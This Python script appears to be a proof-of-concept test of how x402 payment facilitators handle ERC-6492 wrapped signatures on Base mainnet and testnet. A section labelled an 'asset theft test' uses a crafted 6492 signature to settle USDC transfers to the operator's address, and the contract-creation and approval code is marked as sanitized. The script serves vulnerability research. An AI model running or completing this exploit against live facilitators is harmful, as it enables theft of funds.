from simplebase import *


def run(target_name=None):
    import os
    if target_name:
        os.environ["TARGET"] = target_name

    import argparse
    import config,secrets, os
    config.privatekey = config.pk1
    from target import current_target

    # deployed-later signature wrapper

    p = argparse.ArgumentParser(description="ERC-6492 settle/verify test (Base mainnet + testnet)")
    p.add_argument("-t", "--target", help="target name from target.py (defaults to target.DEFAULT_TARGET)")
    args = p.parse_args()

    CHAIN_PRESETS = {
        "base": {
            "chainid": 8453,
            "usdc": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
            "endpoints": [
                "https://mainnet.base.org",
                "https://base.public.blockpi.network/v1/rpc/public",
                "https://base-rpc.publicnode.com",
            ],
            "contract": "0x3Cc49c9Df993D5CfF6e7330d2F47100c068D6aB4",
        },
        "base-sepolia": {
            "chainid": 84532,
            "usdc": "0x036CbD53842c5426634e7929541eC2318f3dCF7e",
            "endpoints": [
                "https://base-sepolia.drpc.org",
                "https://sepolia.base.org",
                "https://base-sepolia-rpc.publicnode.com",
            ],
            # set your own contract via CONTRACT env if different
            "contract": "0x2369445E49B1b197263ab98BfC4E2810091A4525",
        },
    }

    # Always resolve facilitator and amount from target.py (no raw URL input)
    tgt = current_target(args.target)
    chain_key = tgt.network
    if chain_key not in CHAIN_PRESETS:
        raise SystemExit(f"Unsupported network '{chain_key}' for 6492 test")
    chain_cfg = CHAIN_PRESETS[chain_key]
    AMT = tgt.pay_amount
    FACILITATOR = "coinbase" if tgt.name == "coinbase" else tgt.facilitator_base
    CHAINID = chain_cfg["chainid"]
    USDC = chain_cfg["usdc"]
    CONTRACT = os.getenv("CONTRACT", chain_cfg["contract"])

    p = Endpoint_Provider(chain_cfg["endpoints"])

    headers = {}
    if "thirdweb" in tgt.name:
        try:
            headers["x-secret-key"] = config.ThidWeb_Secret_key
        except Exception as exc:
            raise SystemExit("thirdweb target requires ThidWeb_Secret_key in config.py") from exc

    print("FACILITATOR:", FACILITATOR)
    print("AMT:", AMT)
    print("NETWORK:", chain_key)

    print("my usdc bal:", p.callfunction(USDC,"balanceOf(address)",toarg(MYADDR))/1e6)

    if "SALT" in os.environ:
        salt = bd(os.environ["SALT"])
    else:
        salt = secrets.token_bytes(32)


    print(f"SALT={b16e(salt)}")
    ############### Create Sub-contract Code Start#################################
    # sanitized
    ############### Create Sub-contract Code End#################################
    print("sub:", sub)

    contractbal = p.erc20_balanceOf(USDC, sub)
    print("contract bal:", contractbal/1e6)
    needed = max(0, AMT - contractbal)
    if needed > 0:
        print(f"funding sub with {needed/1e6} USDC")
        x = x402_transfer_usdc(FACILITATOR, CHAINID, config.pk1, sub, needed, headers=headers)
        print(x)
    else:
        print("sub has enough balance, skip funding")


    # ERC-6492 contract deployment test
    ############### Create Sub-contract Code Start#################################
    # sanitized
    ############### Create Sub-contract Code End#################################

    # ERC-6492 asset theft test
    ############### Create Transfer Aprovement Code Start#################################
    # sanitized
    ############### Create Transfer Aprovement Code End#################################

    ## Generate Signature
    sig = "0x"+ec(["address","bytes","bytes"],[CONTRACT, bd(cd), bd("11"*131)])+"6492649264926492649264926492649264926492649264926492649264926492"
    print(sig)


    y = x402_transfer_usdc(FACILITATOR, CHAINID, {"from":sub, "sign":lambda i:sig}, MYADDR, AMT, action="verify", headers=headers)
    print("verify1 result:", y)

    x = x402_transfer_usdc(FACILITATOR, CHAINID, {"from":sub, "sign":lambda i:sig}, MYADDR, AMT, headers=headers)
    print("settle result:", x)
    if not x.get("success"):
        y = x402_transfer_usdc(FACILITATOR, CHAINID, {"from":sub, "sign":lambda i:sig}, MYADDR, AMT, action="verify", headers=headers)
        print("verify2 result:", y)


def main():
    run()


if __name__ == "__main__":
    main()
